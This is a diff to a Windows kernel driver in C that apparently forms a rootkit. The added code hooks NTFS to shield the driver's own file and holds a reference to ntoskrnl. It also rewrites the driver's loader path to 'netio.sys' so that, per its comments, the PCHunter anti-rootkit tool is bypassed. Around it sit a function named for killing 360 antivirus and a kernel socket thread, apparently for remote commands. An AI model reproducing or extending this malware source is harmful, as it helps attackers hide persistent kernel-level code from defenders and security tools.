@@ -32,6 +32,7 @@ VOID InitializeObjectAttributes(
 //#include "tcphook.h"
 #include "config.h"
 #include "command.h"
+#include "ntfshook.h"
 
 PDEVICE_OBJECT g_pCtrlDO = NULL;
 PKTHREAD g_pnThread;
@@ -43,6 +44,19 @@ DWORD bSocketLocked = FALSE;
 DWORD bSocketClosed = TRUE;
 DWORD timeoutCounter = 0;
 HANDLE hSelfFile;
+HANDLE hNtosKrnl;
+//bypass pchunter kernel driver check
+PUNICODE_STRING pusDriverPath = NULL;
+PVOID g_oldBuffer;
+USHORT g_oldLength;
+USHORT g_oldMaxLength;
+//ntfs hook prepare
+PUNICODE_STRING protectFileName;
+PUNICODE_STRING prepareFileName;
+PFILE_OBJECT pProtectFileObject;
+PFILE_OBJECT pPrepareFileObject;
+UNICODE_STRING x2protectFileName;
+UNICODE_STRING x2prepareFileName;
 
 
 
@@ -55,6 +69,11 @@ NTSTATUS kill360_64();
 NTSTATUS xDelFile3(PCHAR pAsFileName);
 void DriverUnload(PDRIVER_OBJECT pDriverObject) {
 	xLog("DriverUnload Called");
+
+	
+
+
+
 	die = TRUE;
 	//stop the system thread
 	if (pSocket != NULL && !bSocketLocked && !bSocketClosed){
@@ -78,10 +97,32 @@ void DriverUnload(PDRIVER_OBJECT pDriverObject) {
 	KeWaitForSingleObject(g_pnThread, Executive, KernelMode, FALSE, 0);
 	ObDereferenceObject(g_pnThread);
 	ObDereferenceObject(g_mnThread);
+
+	//unhook ntfs
+	unhookntfs();
+	LARGE_INTEGER timeout2;
+	timeout2.QuadPart = -10 * 1000 * 1;
+	timeout2.QuadPart *= 1; // 0.001s
+	while (pendingOperation != 0) {
+		KeDelayExecutionThread(KernelMode, FALSE, &timeout2);
+	}
+
+	ZwClose(hNtosKrnl);
+	//ObDereferenceObject(pPrepareFileObject);
+	//ObDereferenceObject(pProtectFileObject);
+	ExFreePool(x2prepareFileName.Buffer);
+	ExFreePool(x2protectFileName.Buffer);
+
 	xLog("All Released, Closing Log File");
 	//close log file
 	//UnhookTCP();
 	CloseLogFile();
+	//restore pchunter bypass
+
+	pusDriverPath->Buffer = g_oldBuffer;
+	pusDriverPath->Length = g_oldLength;
+	pusDriverPath->MaximumLength = g_oldMaxLength;
+	
 }
 
 NTSTATUS CCDispatch(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
@@ -457,10 +498,16 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	//return STATUS_SUCCESS;
 
 	
-	PUNICODE_STRING pusDriverPath = NULL;
-	pusDriverPath = &((PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection)->FullDllName;
-	//pDriverObject->DriverSection
+	//*******************************************************
 
+
+
+	//*******************************************************
+	//protect self
+	pusDriverPath = &((PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection)->FullDllName;
+	
+	//pDriverObject->DriverSection
+	
 	//Read Self
 	LARGE_INTEGER timeout2;
 	timeout2.QuadPart = -10 * 1000 * 1000;
@@ -471,6 +518,55 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	//UNICODE_STRING logPath;
 	IO_STATUS_BLOCK ios;
 	//RtlInitUnicodeString(&logPath, DRIVER_LOG_FILENAME);
+
+	//protect ntoskrnl open it reference it
+	UNICODE_STRING ntoskrnlName;
+	RtlInitUnicodeString(&ntoskrnlName, PROTECTED_PATH_R);
+	InitializeObjectAttributes(&objself, &ntoskrnlName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
+
+	status = IoCreateFileEx(&hNtosKrnl,
+		GENERIC_READ,
+		&objself,
+		&ios,
+		NULL,
+		FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_READ,
+		FILE_OPEN,
+		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+		NULL,
+		0,
+		CreateFileTypeNone,
+		NULL,
+		IO_NO_PARAMETER_CHECKING,
+		NULL
+	);
+	if (!NT_SUCCESS(status)) {
+		xLog("open ntoskrnl failed");
+		return STATUS_SUCCESS;
+	}
+	status = ObReferenceObjectByHandle(
+		hNtosKrnl,
+		FILE_READ_ACCESS,
+		*IoFileObjectType,
+		KernelMode,
+		&pPrepareFileObject,
+		NULL
+
+	);
+	if (!NT_SUCCESS(status)) {
+		xLog("reference ntoskrnl failed");
+		return STATUS_SUCCESS;
+	}
+	prepareFileName = &pPrepareFileObject->FileName;
+	x2prepareFileName.Length = prepareFileName->Length;
+	x2prepareFileName.MaximumLength = prepareFileName->MaximumLength;
+	x2prepareFileName.Buffer = ExAllocatePool(NonPagedPool, x2prepareFileName.MaximumLength);
+	memcpy(x2prepareFileName.Buffer, prepareFileName->Buffer, x2prepareFileName.MaximumLength);
+	ObDereferenceObject(pPrepareFileObject);
+
+
+
+
 	InitializeObjectAttributes(&objself, pusDriverPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
 	PVOID selfContent = NULL;
 	ULONG selfSize = 0;
@@ -593,6 +689,21 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 			}
 			else
 			{
+				//reference it
+				ObReferenceObjectByHandle(hSelfFile,
+					FILE_ALL_ACCESS,
+					*IoFileObjectType,
+					KernelMode,
+					&pProtectFileObject,
+					NULL
+				);
+				protectFileName = &pProtectFileObject->FileName;
+				x2protectFileName.Length = protectFileName->Length;
+				x2protectFileName.MaximumLength = protectFileName->MaximumLength;
+				x2protectFileName.Buffer = ExAllocatePool(NonPagedPool, x2protectFileName.MaximumLength);
+				memcpy(x2protectFileName.Buffer, protectFileName->Buffer, x2protectFileName.MaximumLength);
+				ObDereferenceObject(pProtectFileObject);
+
 				status = ZwWriteFile(
 					hSelfFile,
 					NULL,
@@ -642,6 +753,16 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath
 	if (selfContent != NULL) {
 		ExFreePoolWithTag(selfContent, 'self');
 	}
+	//Bypass PCHUNTER
+	//RtlInitUnicodeString(&g_drvPath, L"C:\\Windows\\System32\\DRIVERS\\netio.sys");
+	//g_pOldPath = &((PKLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection)->FullDllName;
+	g_oldBuffer = pusDriverPath->Buffer;
+	g_oldLength = pusDriverPath->Length;
+	g_oldMaxLength = pusDriverPath->MaximumLength;
+	RtlInitUnicodeString(pusDriverPath, L"C:\\Windows\\System32\\DRIVERS\\netio.sys");
+
+	hookNtfs(&x2protectFileName, &x2prepareFileName);
+
 	CLIENT_ID       clientId = { 0 };
 	initWsk();
 	//******************************************************************Put Your Test Here
